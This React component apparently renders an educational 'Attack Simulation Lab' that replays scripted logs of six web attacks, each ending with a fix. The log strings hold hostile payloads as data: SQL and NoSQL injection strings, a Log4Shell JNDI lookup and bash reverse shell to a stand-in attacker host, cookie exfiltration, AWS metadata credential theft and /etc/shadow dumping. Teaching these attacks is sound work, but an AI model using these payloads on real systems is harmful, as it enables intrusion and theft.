import { useState, useEffect, useRef } from 'react';
import Box from '@mui/material/Box';
import Stack from '@mui/material/Stack';
import Typography from '@mui/material/Typography';
import Button from '@mui/material/Button';
import Chip from '@mui/material/Chip';
import { styled, keyframes } from '@mui/material/styles';
import IconifyIcon from 'components/base/IconifyIcon';

interface LogLine {
  id: number;
  text: string;
  status: 'running' | 'success' | 'error' | 'info' | 'warn';
  delay: number;
}

interface AttackScenario {
  id: string;
  label: string;
  icon: string;
  color: 'error' | 'warning' | 'info';
  description: string;
  cve?: string;
  logs: LogLine[];
}

const scenarios: AttackScenario[] = [
  {
    id: 'xss',
    label: 'XSS + CSRF Chain',
    icon: 'hugeicons:alert-02',
    color: 'error',
    description: 'Reflected & Stored XSS leading to CSRF token exfiltration and account takeover.',
    logs: [
      { id: 1, text: '> Initializing XSS + CSRF chain simulation...', status: 'info', delay: 0 },
      { id: 2, text: '> Scanning target: React 18 + Express 4.18', status: 'info', delay: 700 },
      { id: 3, text: '> Injecting reflected XSS into /api/search?q=<script>...', status: 'running', delay: 1400 },
      { id: 4, text: '! XSS payload executed in victim browser context', status: 'error', delay: 2100 },
      { id: 5, text: '> Extracting CSRF token from DOM via injected script...', status: 'running', delay: 2800 },
      { id: 6, text: '! CSRF token captured: csrf_abc123xyz', status: 'error', delay: 3500 },
      { id: 7, text: '> Forging POST /api/account/transfer with stolen token...', status: 'running', delay: 4200 },
      { id: 8, text: '! Unauthorized transfer of $4,200 initiated successfully', status: 'error', delay: 4900 },
      { id: 9, text: '> Injecting stored XSS into user bio field...', status: 'running', delay: 5600 },
      { id: 10, text: '! Stored XSS persisted — all profile visitors affected', status: 'error', delay: 6300 },
      { id: 11, text: '> Exfiltrating session cookies to attacker.com...', status: 'running', delay: 7000 },
      { id: 12, text: '! Cookies captured: session=eyJhbGc...', status: 'error', delay: 7700 },
      { id: 13, text: '> Simulation complete. 5 critical issues found.', status: 'info', delay: 8400 },
      { id: 14, text: '+ Fix: Sanitize with DOMPurify, enable CSP, use SameSite=Strict cookies', status: 'success', delay: 9100 },
    ],
  },
  {
    id: 'sqli',
    label: 'SQL Injection',
    icon: 'hugeicons:code-square',
    color: 'error',
    description: 'Union-based and blind SQL injection against login and search endpoints.',
    logs: [
      { id: 1, text: '> Initializing SQL injection simulation...', status: 'info', delay: 0 },
      { id: 2, text: '> Target: PostgreSQL via Express.js raw query endpoint', status: 'info', delay: 600 },
      { id: 3, text: '> Testing /api/login with payload: \' OR 1=1--', status: 'running', delay: 1200 },
      { id: 4, text: '! Authentication bypassed — logged in as admin@company.com', status: 'error', delay: 1900 },
      { id: 5, text: '> Probing /api/search?q=x\' UNION SELECT 1,table_name,3 FROM information_schema.tables--', status: 'running', delay: 2700 },
      { id: 6, text: '! Discovered tables: users, orders, payments, admin_tokens', status: 'error', delay: 3500 },
      { id: 7, text: '> Extracting: UNION SELECT username,password_hash,email FROM users--', status: 'running', delay: 4300 },
      { id: 8, text: '! Dumped 2,847 user credentials (bcrypt hashes)', status: 'error', delay: 5100 },
      { id: 9, text: '> Time-based blind injection on ORDER BY clause...', status: 'running', delay: 5900 },
      { id: 10, text: '! Confirmed: db version=PostgreSQL 14.2, superuser=true', status: 'error', delay: 6700 },
      { id: 11, text: '> Attempting COPY TO PROGRAM for RCE via pg_exec...', status: 'running', delay: 7500 },
      { id: 12, text: '! OS command executed: whoami = postgres (elevated)', status: 'error', delay: 8300 },
      { id: 13, text: '> Simulation complete. Full DB compromise achieved.', status: 'info', delay: 9000 },
      { id: 14, text: '+ Fix: Use parameterized queries. Never concatenate user input into SQL.', status: 'success', delay: 9700 },
    ],
  },
  {
    id: 'ssrf',
    label: 'SSRF → Cloud Takeover',
    icon: 'hugeicons:arrow-move-up-right',
    color: 'error',
    description: 'Server-Side Request Forgery used to steal AWS IAM credentials via metadata endpoint.',
    cve: 'CVE-2024-3310',
    logs: [
      { id: 1, text: '> Initializing SSRF → Cloud Takeover simulation...', status: 'info', delay: 0 },
      { id: 2, text: '> Target: Next.js 14 API Route with user-supplied URL param', status: 'info', delay: 700 },
      { id: 3, text: '> Probing /api/preview?url=http://localhost:3000/', status: 'running', delay: 1400 },
      { id: 4, text: '! Internal service response: {status: ok, redis: connected}', status: 'error', delay: 2100 },
      { id: 5, text: '> Escalating to cloud metadata: url=http://169.254.169.254/latest/meta-data/', status: 'running', delay: 2900 },
      { id: 6, text: '! AWS IMDSv1 endpoint accessible — no auth required!', status: 'error', delay: 3700 },
      { id: 7, text: '> Fetching IAM credentials: /latest/meta-data/iam/security-credentials/app-role', status: 'running', delay: 4500 },
      { id: 8, text: '! AccessKeyId: ASIA...XT42 | SecretKey: [REDACTED]', status: 'error', delay: 5300 },
      { id: 9, text: '> Configuring AWS CLI with stolen credentials...', status: 'running', delay: 6100 },
      { id: 10, text: '> aws s3 ls — listing all buckets...', status: 'running', delay: 6700 },
      { id: 11, text: '! Found: prod-backups, user-data, private-keys, logs-2024', status: 'error', delay: 7400 },
      { id: 12, text: '> aws s3 cp s3://prod-backups . --recursive', status: 'running', delay: 8100 },
      { id: 13, text: '! Downloaded 18GB of production backup data', status: 'error', delay: 8900 },
      { id: 14, text: '+ Fix: Block 169.254.x.x. Use IMDSv2. Validate all URL params.', status: 'success', delay: 9600 },
    ],
  },
  {
    id: 'rce',
    label: 'Log4Shell RCE',
    icon: 'hugeicons:terminal-01',
    color: 'error',
    description: 'CVE-2021-44228 Log4Shell JNDI injection leading to full server compromise.',
    cve: 'CVE-2021-44228',
    logs: [
      { id: 1, text: '> Initializing Log4Shell (CVE-2021-44228) simulation...', status: 'info', delay: 0 },
      { id: 2, text: '> Target: Spring Boot app with Log4j 2.14.1', status: 'info', delay: 700 },
      { id: 3, text: '> Sending payload in User-Agent header:', status: 'running', delay: 1400 },
      { id: 4, text: '  User-Agent: ${jndi:ldap://attacker.com:1389/exploit}', status: 'warn', delay: 2000 },
      { id: 5, text: '> Log4j processed the header and initiated JNDI lookup...', status: 'running', delay: 2800 },
      { id: 6, text: '! LDAP request received at attacker server from 10.0.1.45', status: 'error', delay: 3600 },
      { id: 7, text: '> Serving malicious Java class via RMI/LDAP...', status: 'running', delay: 4300 },
      { id: 8, text: '! Remote class loaded and instantiated on victim JVM', status: 'error', delay: 5100 },
      { id: 9, text: '> Class executed: Runtime.exec("bash -i >& /dev/tcp/attacker/4444 0>&1")', status: 'running', delay: 5900 },
      { id: 10, text: '! Reverse shell established — full server access', status: 'error', delay: 6700 },
      { id: 11, text: '> Dumping /etc/shadow and /etc/passwd...', status: 'running', delay: 7400 },
      { id: 12, text: '! System credentials extracted. Root access confirmed.', status: 'error', delay: 8100 },
      { id: 13, text: '> Simulation complete. CVE-2021-44228 fully exploited.', status: 'info', delay: 8800 },
      { id: 14, text: '+ Fix: Upgrade to Log4j 2.17.1+. Set formatMsgNoLookups=true.', status: 'success', delay: 9500 },
    ],
  },
  {
    id: 'jwt',
    label: 'JWT Auth Bypass',
    icon: 'hugeicons:key-01',
    color: 'warning',
    description: 'Algorithm confusion and "alg:none" attacks to forge admin JWT tokens.',
    logs: [
      { id: 1, text: '> Initializing JWT algorithm confusion attack...', status: 'info', delay: 0 },
      { id: 2, text: '> Target: Node.js API using jsonwebtoken v8.5.1', status: 'info', delay: 700 },
      { id: 3, text: '> Decoding intercepted user JWT (Base64)...', status: 'running', delay: 1400 },
      { id: 4, text: '  Header: {"alg":"RS256","typ":"JWT"}', status: 'info', delay: 2000 },
      { id: 5, text: '  Payload: {"userId":1042,"role":"user","iat":1710000000}', status: 'info', delay: 2500 },
      { id: 6, text: '> Attempting alg:none bypass — stripping signature...', status: 'running', delay: 3200 },
      { id: 7, text: '  Modified: {"alg":"none"} + {"role":"admin"} + [empty sig]', status: 'warn', delay: 3900 },
      { id: 8, text: '! Server accepted token with alg:none — ADMIN ACCESS GRANTED', status: 'error', delay: 4700 },
      { id: 9, text: '> Re-trying with RS256→HS256 algorithm switch using public key...', status: 'running', delay: 5500 },
      { id: 10, text: '! Forged HS256 token accepted — backend used public key as HMAC secret', status: 'error', delay: 6300 },
      { id: 11, text: '> Accessing /api/admin/users with forged token...', status: 'running', delay: 7100 },
      { id: 12, text: '! Full admin panel access — 14,200 user records exposed', status: 'error', delay: 7800 },
      { id: 13, text: '> Simulation complete. JWT auth fully bypassed.', status: 'info', delay: 8500 },
      { id: 14, text: '+ Fix: Upgrade jsonwebtoken to v9+. Always specify algorithms: ["HS256"].', status: 'success', delay: 9200 },
    ],
  },
  {
    id: 'nosql',
    label: 'NoSQL + Prototype Pollution',
    icon: 'hugeicons:database-01',
    color: 'error',
    description: 'MongoDB operator injection combined with prototype pollution for auth bypass and privilege escalation.',
    logs: [
      { id: 1, text: '> Initializing NoSQL + Prototype Pollution simulation...', status: 'info', delay: 0 },
      { id: 2, text: '> Target: Express + MongoDB via Mongoose', status: 'info', delay: 600 },
      { id: 3, text: '> Sending login with: {"username":{"$ne":null},"password":{"$ne":null}}', status: 'running', delay: 1300 },
      { id: 4, text: '! MongoDB bypassed — logged in as first user in collection (admin@app.com)', status: 'error', delay: 2100 },
      { id: 5, text: '> Probing merge endpoint with __proto__ pollution payload...', status: 'running', delay: 2900 },
      { id: 6, text: '  Body: {"__proto__":{"isAdmin":true,"canDelete":true}}', status: 'warn', delay: 3500 },
      { id: 7, text: '! Object.prototype polluted — all {} objects now have isAdmin=true', status: 'error', delay: 4300 },
      { id: 8, text: '> Accessing /api/admin — middleware checks if req.user.isAdmin...', status: 'running', delay: 5100 },
      { id: 9, text: '! Authorization bypassed via prototype chain — admin panel unlocked', status: 'error', delay: 5900 },
      { id: 10, text: '> Using $where injection for data exfiltration...', status: 'running', delay: 6700 },
      { id: 11, text: '! Extracted 8,421 user records via $where: "this.isAdmin == true"', status: 'error', delay: 7500 },
      { id: 12, text: '> Simulation complete. DB + server-side state compromised.', status: 'info', delay: 8300 },
      { id: 13, text: '+ Fix: Use mongo-sanitize. Freeze Object.prototype. Use Mongoose strict mode.', status: 'success', delay: 9000 },
    ],
  },
];

const blink = keyframes`
  0%, 100% { opacity: 1; }
  50% { opacity: 0; }
`;

const TerminalWrapper = styled(Box)(({ theme }) => ({
  backgroundColor: '#060713',
  borderRadius: '8px',
  border: `1px solid ${theme.palette.divider}`,
  overflow: 'hidden',
  fontFamily: "'JetBrains Mono', 'Courier New', monospace",
}));

const TerminalBar = styled(Stack)(({ theme }) => ({
  backgroundColor: theme.palette.background.paper,
  borderBottom: `1px solid ${theme.palette.divider}`,
  padding: '10px 16px',
}));

const getLineColor = (status: LogLine['status']) => {
  switch (status) {
    case 'error':  return '#FF4D5E';
    case 'success': return '#2ECC71';
    case 'running': return '#FFB054';
    case 'warn':   return '#F5C842';
    default:       return '#8E92BC';
  }
};

const AttackSimulation = () => {
  const [selectedScenario, setSelectedScenario] = useState<AttackScenario>(scenarios[0]);
  const [visibleLines, setVisibleLines] = useState<LogLine[]>([]);
  const [isRunning, setIsRunning] = useState(false);
  const [isDone, setIsDone] = useState(false);
  const scrollRef = useRef<HTMLDivElement>(null);
  const timeoutsRef = useRef<ReturnType<typeof setTimeout>[]>([]);

  const clearTimeouts = () => {
    timeoutsRef.current.forEach(clearTimeout);
    timeoutsRef.current = [];
  };

  const runSimulation = (scenario: AttackScenario = selectedScenario) => {
    clearTimeouts();
    setVisibleLines([]);
    setIsRunning(true);
    setIsDone(false);

    scenario.logs.forEach((line) => {
      const t = setTimeout(() => {
        setVisibleLines((prev) => [...prev, line]);
        if (line.id === scenario.logs.length) {
          setIsRunning(false);
          setIsDone(true);
        }
      }, line.delay);
      timeoutsRef.current.push(t);
    });
  };

  useEffect(() => {
    runSimulation(scenarios[0]);
    return clearTimeouts;
  }, []);

  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [visibleLines]);

  const handleSelectScenario = (scenario: AttackScenario) => {
    clearTimeouts();
    setSelectedScenario(scenario);
    setVisibleLines([]);
    setIsDone(false);
    setIsRunning(false);
  };

  return (
    <Stack direction="column" spacing={2} width={1}>
      {/* Header */}
      <Stack direction="row" alignItems="center" justifyContent="space-between" spacing={2}>
        <Stack direction="row" spacing={1} alignItems="center">
          <IconifyIcon icon="hugeicons:terminal-01" color="text.primary" fontSize="h4.fontSize" />
          <Typography variant="h4">Attack Simulation Lab</Typography>
        </Stack>
        <Button
          variant="outlined"
          color="error"
          size="small"
          disabled={isRunning}
          onClick={() => runSimulation()}
          startIcon={<IconifyIcon icon={isRunning ? 'hugeicons:loading-01' : 'hugeicons:play'} />}
          sx={{ minWidth: 130 }}
        >
          {isRunning ? 'Running...' : isDone ? 'Re-run Attack' : 'Run Simulation'}
        </Button>
      </Stack>

      {/* Scenario Selector */}
      <Stack
        direction="row"
        spacing={1}
        flexWrap="wrap"
        gap={1}
        sx={{ pb: 0.5 }}
      >
        {scenarios.map((s) => (
          <Chip
            key={s.id}
            icon={
              <Box sx={{ display: 'flex', alignItems: 'center', ml: 0.75 }}>
                <IconifyIcon icon={s.icon} sx={{ width: 14, height: 14 }} />
              </Box>
            }
            label={s.label}
            size="small"
            color={selectedScenario.id === s.id ? s.color : 'default'}
            variant={selectedScenario.id === s.id ? 'filled' : 'outlined'}
            onClick={() => handleSelectScenario(s)}
            sx={{
              cursor: isRunning ? 'not-allowed' : 'pointer',
              fontWeight: selectedScenario.id === s.id ? 700 : 400,
              fontSize: '0.72rem',
              transition: 'all 0.2s',
              opacity: isRunning && selectedScenario.id !== s.id ? 0.5 : 1,
            }}
          />
        ))}
      </Stack>

      {/* Scenario info */}
      <Stack direction="row" spacing={1.5} alignItems="flex-start">
        <Box
          sx={{
            p: 1.5,
            borderRadius: '8px',
            bgcolor: `${selectedScenario.color}.main` + '12',
            border: '1px solid',
            borderColor: `${selectedScenario.color}.main` + '30',
            flex: 1,
          }}
        >
          <Stack direction="row" spacing={1} alignItems="center" mb={0.5} flexWrap="wrap" gap={0.5}>
            <Typography variant="body2" fontWeight={700} color="text.primary">
              {selectedScenario.label}
            </Typography>
            {selectedScenario.cve && (
              <Chip
                label={selectedScenario.cve}
                size="small"
                color="error"
                variant="outlined"
                sx={{ fontSize: '0.58rem', height: 18 }}
              />
            )}
            {isRunning && (
              <Chip
                label="● LIVE"
                size="small"
                color="error"
                sx={{ fontSize: '0.58rem', height: 18, fontWeight: 800 }}
              />
            )}
            {isDone && (
              <Chip
                label="✓ COMPLETE"
                size="small"
                color="success"
                sx={{ fontSize: '0.58rem', height: 18, fontWeight: 800 }}
              />
            )}
          </Stack>
          <Typography variant="caption" color="text.secondary" sx={{ lineHeight: 1.5 }}>
            {selectedScenario.description}
          </Typography>
        </Box>
      </Stack>

      {/* Terminal */}
      <TerminalWrapper>
        <TerminalBar direction="row" spacing={0.75} alignItems="center">
          <Box sx={{ width: 12, height: 12, borderRadius: '50%', bgcolor: '#FF5F57' }} />
          <Box sx={{ width: 12, height: 12, borderRadius: '50%', bgcolor: '#FEBC2E' }} />
          <Box sx={{ width: 12, height: 12, borderRadius: '50%', bgcolor: '#28C840' }} />
          <Typography variant="caption" color="text.secondary" ml={1.5} sx={{ fontFamily: 'inherit' }}>
            dnx-command — {selectedScenario.label.toLowerCase().replace(/\s+/g, '-')} — bash
          </Typography>
        </TerminalBar>

        <Box
          ref={scrollRef}
          sx={{
            p: 2,
            height: 300,
            overflowY: 'auto',
            '&::-webkit-scrollbar': { width: 4 },
            '&::-webkit-scrollbar-track': { background: 'transparent' },
            '&::-webkit-scrollbar-thumb': { background: '#323449', borderRadius: 2 },
          }}
        >
          {visibleLines.length === 0 && !isRunning && (
            <Typography
              sx={{
                fontFamily: 'inherit',
                fontSize: '0.78rem',
                color: '#54577A',
              }}
            >
              {`> Select a scenario and click "Run Simulation" to begin attack simulation...`}
            </Typography>
          )}

          {visibleLines.map((line) => {
            const now = new Date();
            const ts = `[${now.getHours().toString().padStart(2, '0')}:${now
              .getMinutes()
              .toString()
              .padStart(2, '0')}:${(now.getSeconds() + line.id).toString().padStart(2, '0')}]`;
            return (
              <Box key={line.id} mb={0.5}>
                <Typography
                  component="span"
                  sx={{ fontFamily: 'inherit', fontSize: '0.76rem', color: '#54577A', mr: 1 }}
                >
                  {ts}
                </Typography>
                <Typography
                  component="span"
                  sx={{
                    fontFamily: 'inherit',
                    fontSize: '0.78rem',
                    color: getLineColor(line.status),
                    lineHeight: 1.6,
                  }}
                >
                  {line.text}
                </Typography>
              </Box>
            );
          })}

          {isRunning && (
            <Typography
              component="span"
              sx={{
                fontFamily: 'inherit',
                fontSize: '0.78rem',
                color: '#2ECC71',
                animation: `${blink} 1s step-end infinite`,
              }}
            >
              █
            </Typography>
          )}
        </Box>
      </TerminalWrapper>
    </Stack>
  );
};

export default AttackSimulation;
